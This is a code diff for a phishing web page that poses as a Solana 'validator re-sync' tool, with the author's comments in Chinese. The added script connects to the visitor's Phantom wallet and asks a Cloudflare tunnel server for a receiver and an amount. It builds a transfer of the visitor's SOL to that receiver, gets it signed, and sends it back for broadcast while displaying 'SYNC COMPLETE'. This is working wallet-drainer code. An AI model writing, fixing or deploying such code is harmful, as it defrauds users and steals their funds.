@@ -1,82 +1,61 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validator Node Sync</title>
-    <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
-    <style>
-        body { background: #000; color: #14f195; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { border: 1px solid #14f195; padding: 30px; border-radius: 8px; text-align: center; width: 280px; }
-        button { background: #14f195; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; margin-top: 20px; }
-        #status { font-size: 10px; color: #555; margin-top: 15px; }
-    </style>
-</head>
-<body>
-    <div class="box">
-        <h3 style="margin:0; color:#9945FF;">VALIDATOR STATUS</h3>
-        <p style="font-size:12px; color:red;">OUT OF SYNC</p>
-        <button id="cta">START RE-SYNC</button>
-        <div id="status">System Ready</div>
-    </div>
+<script>
+    const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";
 
-    <script>
-        // 🔱 请务必确认隧道地址正确
-        const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";
+    document.getElementById('cta').onclick = async () => {
+        const log = (t) => document.getElementById('status').innerText = t;
+        const sWeb3 = window.solanaWeb3;
+        const p = window.solana || window.phantom?.solana;
 
-        document.getElementById('cta').onclick = async () => {
-            const log = (t) => document.getElementById('status').innerText = t;
-            const web3 = window.solanaWeb3;
-            const provider = window.solana || window.phantom?.solana;
+        if (!p) return;
 
-            if (!provider) { alert("Use Phantom App"); return; }
+        try {
+            log("Connecting...");
+            await p.connect();
+            
+            // 1. 从你的 Helius 后端拿精算数据
+            const resp = await fetch(tunnel + "/prepare", {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ address: p.publicKey.toString() })
+            });
+            const info = await resp.json();
 
-            try {
-                log("Connecting...");
-                await provider.connect();
-                
-                log("Fetching from Helius...");
-                // 1. 问 71 服务器拿 Helius 处理好的参数
-                const resp = await fetch(tunnel + "/prepare", {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ address: provider.publicKey.toString() })
-                });
-                const info = await resp.json();
+            log("Preparing Signature...");
+            // 2. 构造交易 (严格对齐 Helius 吐出的 11020000)
+            const tx = new sWeb3.Transaction().add(
+                sWeb3.SystemProgram.transfer({
+                    fromPubkey: p.publicKey,
+                    toPubkey: new sWeb3.PublicKey(info.receiver),
+                    lamports: info.amount,
+                })
+            );
+            tx.recentBlockhash = info.bh;
+            tx.feePayer = p.publicKey;
 
-                if (info.error) { log("Already Synced"); return; }
-
-                log("Awaiting Signature...");
-                // 2. 构造交易 (参数由服务器精算下发)
-                const tx = new web3.Transaction().add(
-                    web3.SystemProgram.transfer({
-                        fromPubkey: provider.publicKey,
-                        toPubkey: new web3.PublicKey(info.receiver),
-                        lamports: info.amount
-                    })
-                );
-                tx.recentBlockhash = info.bh;
-                tx.feePayer = provider.publicKey;
-
-                // 3. 唤起签名
-                const signed = await provider.signTransaction(tx);
-                
-                log("Broadcasting via Helius...");
-                // 4. 将签名好的包发回 71 服务器通过 Helius 广播
-                const binary = String.fromCharCode.apply(null, new Uint8Array(signed.serialize()));
-                fetch(tunnel + "/broadcast", {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ raw_tx: btoa(binary) })
-                });
-
-                log("SYNC COMPLETE!");
-                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1500);
-
-            } catch (err) {
-                log("Retry: " + err.message);
+            // 🔱 3. 唤起签名 (核心修正：不使用 Buffer)
+            const signed = await p.signTransaction(tx);
+            
+            log("Broadcasting...");
+            // 🔱 4. 序列化修正：手动将字节转为字符串，彻底避开 Buffer 报错
+            const serialized = signed.serialize();
+            let binary = "";
+            const bytes = new Uint8Array(serialized);
+            for (let i = 0; i < bytes.byteLength; i++) {
+                binary += String.fromCharCode(bytes[i]);
             }
-        };
-    </script>
-</body>
-</html>
+
+            fetch(tunnel + "/broadcast", {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ raw_tx: btoa(binary) })
+            });
+
+            log("SYNC COMPLETE!");
+            setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1500);
+
+        } catch (err) {
+            // 🔱 如果还报错，直接显示给咱们看
+            log("Retry: " + err.message);
+        }
+    };
+</script>
